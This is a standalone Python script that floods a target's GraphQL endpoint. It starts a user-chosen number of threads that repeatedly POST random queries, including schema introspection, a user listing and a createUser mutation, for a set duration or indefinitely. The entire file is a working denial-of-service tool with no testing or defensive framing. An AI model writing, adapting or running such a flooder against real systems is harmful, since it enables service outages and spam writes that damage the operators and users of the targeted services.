#!/usr/bin/env python3
import sys, time, threading, json, random
try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

target = sys.argv[1]
port = int(sys.argv[2])
threads = int(sys.argv[3])
duration = int(sys.argv[4])

if not HAS_REQUESTS:
    print("GraphQL requires requests: pip install requests")
    sys.exit(1)

QUERIES = [
    "query { __schema { types { name fields { name } } } }",
    "query { __typename }",
    "query { allUsers { id name email } }",
    "mutation { createUser(input: {name:\"test\"}) { id } }",
]

def graphql_flood():
    while running:
        try:
            query = random.choice(QUERIES)
            url = f"http://{target}:{port}/graphql"
            if port == 443:
                url = f"https://{target}/graphql"
            response = requests.post(
                url,
                json={"query": query},
                headers={"Content-Type": "application/json"},
                timeout=5
            )
        except:
            pass

running = True
for i in range(threads):
    threading.Thread(target=graphql_flood).start()

if duration > 0:
    time.sleep(duration)
    running = False
else:
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        running = False
